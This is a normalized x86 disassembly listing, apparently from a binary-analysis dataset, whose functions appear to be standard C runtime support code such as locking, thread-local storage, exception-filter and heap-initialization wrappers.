mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_402bcd
pop ecx
sub_402adf
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_402b12
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_402b82
push ecx
mov [ ecx ] r--data
call sub_4087ac
pop ecx
retn
sub_402d6d
push 0xa
call sub_402daf
pop ecx
retn
sub_402daf
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_402dc4
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
pop ebp
jmp [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_402de2
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsFree@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_402e01
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsGetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_40315e
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ SetUnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_40316c
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ Sleep@IAT ]
pop ebp
retn
sub_40317a
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop ebp
retn
sub_40318f
push ebp
mov ebp esp
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push [ ebp + 0x8 ]
call [ UnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_403499
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_403501
push esi
xor esi esi
push [ esi + rw-data ]
call [ EncodePointer@IAT ]
mov [ esi + rw-data ] eax
add esi 0x4
cmp esi 0x28
jb r-xdata
pop esi
retn
sub_403544
xor eax eax
inc eax
retn
sub_403558
push 0x8
push r--data
call sub_4021d0
call sub_40638a
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_408bab
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_403578
xor eax eax
inc eax
retn
sub_40358c
call sub_40638a
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_403558
call eax
sub_40359f
push sub_403558
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_4035b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4035bd
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_4035ca
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_403767
test ebx ebx
je r-xdata
retn
push 0x0
call sub_402daf
pop ecx
sub_4037db
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4037e8
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_403b45
pop ecx
mov [ rw-data ] 0x1
sub_403b3c
push 0xd
call sub_402daf
pop ecx
retn
sub_403cb7
push 0xd
call sub_402daf
pop ecx
retn
sub_40408b
call sub_405fc2
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_402bcd
and [ rw-data ] 0x0
pop ecx
retn
call sub_4090c0
sub_404ed6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_404e00
add esp 0xc
pop ebp
retn 0x4
sub_404f09
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_4093b5
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_404f3b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_404e00
add esp 0xc
pop ebp
retn 0x8
sub_40568b
push esi
call sub_4096cb
pop ecx
retn
sub_405fc2
push 0x1
call sub_405fcc
pop ecx
retn
sub_406074
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_404161
pop ecx
pop ecx
retn
sub_4060a7
push 0x1
call sub_402daf
pop ecx
retn
sub_406163
push esi
call sub_4096cb
pop ecx
retn
sub_406375
push 0xd
call sub_402daf
pop ecx
retn
sub_406381
push 0xc
call sub_402daf
pop ecx
retn
sub_4064b2
push 0xd
call sub_402daf
pop ecx
retn
sub_4064bb
push 0xc
call sub_402daf
pop ecx
retn
sub_40653a
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
jmp sub_402c79
push eax
call sub_402de2
or [ rw-data ] 0xffffffff
pop ecx
sub_406598
push sub_406557
call sub_40315e
pop ecx
xor eax eax
retn
sub_406701
call [ GetProcessHeap@IAT ]
xor ecx ecx
mov [ rw-data ] eax
test eax eax
setne cl
mov eax ecx
retn
sub_4069c1
push 0xb
call sub_402daf
pop ecx
retn
sub_406ce9
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_406e7c
and [ rw-data ] 0x0
retn
sub_407166
push edi
call sub_4096cb
pop ecx
retn
sub_408266
push 0xc
call sub_402daf
pop ecx
retn
sub_4082f4
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_4082ba
pop ecx
pop ecx
pop ebp
retn
sub_408616
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_408521
add esp 0x10
pop ebp
retn
sub_408814
push 0xe
call sub_402daf
pop ecx
retn
sub_4088e5
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_408ba2
push 0x2
call sub_4019a1
sub_409154
push 0x1
call sub_402daf
pop ecx
retn
sub_409281
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40915d
add esp 0x14
pop ebp
retn
sub_409389
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_4092c0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_4093d4
call eax
retn
sub_4095d5
push 0xa
call sub_402daf
pop ecx
retn
sub_409833
push edi
call sub_4096cb
pop ecx
retn
sub_409f70
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_409740
sub_409f86
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_409740
sub_40a018
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_40a02f
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_40a097
push 0xc
call sub_402daf
pop ecx
retn
sub_40a462
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40a330
add esp 0x10
pop ebp
retn
sub_40a4b4
push ebp
mov ebp esp
call sub_40a4cb
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_40c25a
sub_40a4cb
mov eax sub_40b7bc
mov [ rw-data ] sub_40c0a8
mov [ rw-data ] eax
mov [ rw-data ] sub_40c139
mov [ rw-data ] sub_40c193
mov [ rw-data ] sub_40c218
mov [ rw-data ] eax
mov [ rw-data ] sub_40b7dd
mov [ rw-data ] sub_40c151
mov [ rw-data ] sub_40c0b9
mov [ rw-data ] sub_40c1a4
retn
sub_40bbbf
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40bd2e
add esp 0x18
pop ebp
retn
sub_40c0a8
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_40c0b9
pop ecx
pop ecx
pop ebp
retn
sub_40c139
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c151
add esp 0x10
pop ebp
retn
sub_40c193
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_40c1a4
pop ecx
pop ecx
pop ebp
retn
sub_40de11
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp [ eax ] 0xc000001d
je r-xdata
xor eax eax
retn
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_40e2fc
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_40e305
mov esp [ ebp - 0x18 ]
call sub_403558
sub_40e327
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_4029ff
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40e342
mov [ ecx ] r--data
jmp sub_402a22
sub_40e407
push [ ebp - 0x14 ]
call sub_40e5f3
pop ecx
retn
sub_40e538
push 0x4
mov eax sub_40f0e3
call sub_40f074
call sub_40638a
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_40358c
call sub_403520
sub_40ec27
xor eax eax
inc eax
retn
sub_40ec2b
mov esp [ ebp - 0x18 ]
call sub_403558
sub_40ede2
xor eax eax
inc eax
retn
sub_40ede6
mov esp [ ebp - 0x18 ]
call sub_403558
sub_40eec5
push [ ebp - 0x14 ]
call sub_40edf6
pop ecx
retn
sub_40ef03
call sub_40638a
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_40638a
dec [ eax + 0x90 ]
sub_40f065
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
neg eax
sbb eax eax
and eax 0x1
pop ebp
retn
sub_40f0b0
mov eax [ ebp - 0x5c ]
push eax
call j_sub_402bcd
pop ecx
retn
sub_40f0bb
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x54 ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_40174b
add eax 0x4
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40174b
mov eax r--data
jmp sub_40e21a
sub_40f0e3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40174b
mov eax r--data
jmp sub_40e21a
